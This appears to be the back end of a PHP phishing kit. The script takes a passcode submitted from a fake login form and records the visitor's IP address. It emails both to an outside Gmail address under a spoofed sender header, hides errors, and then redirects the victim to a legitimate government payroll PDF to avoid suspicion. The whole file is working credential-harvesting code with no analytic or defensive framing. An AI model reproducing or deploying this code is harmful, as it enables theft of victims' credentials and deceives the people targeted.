<?php
error_reporting(0);
session_start();
$_SESSION['email'] = $_POST['email'];  

        $ip = getenv("REMOTE_ADDR");
        $message .= "Passcode: ".$_POST['passcode']."\n";
        $message .= "IP : ".$ip."\n";
        $send = "smtpplease2020@gmail.com";
        
        $subject = "~ EDURANDOM ~ $ip ~";

        $headers = "From: Don <logs@ok.edu>";
        $headers .= $email."\n";
        $headers .= "MIME-Version: 1.0\n";

        mail("$send", "$subject", $message);

        echo '<script>window.top.location.href="https://www.doi.gov/sites/doi.gov/files/uploads/IBC_PayrollCalendar_2021_Basic.pdf";</script>';
	  

?>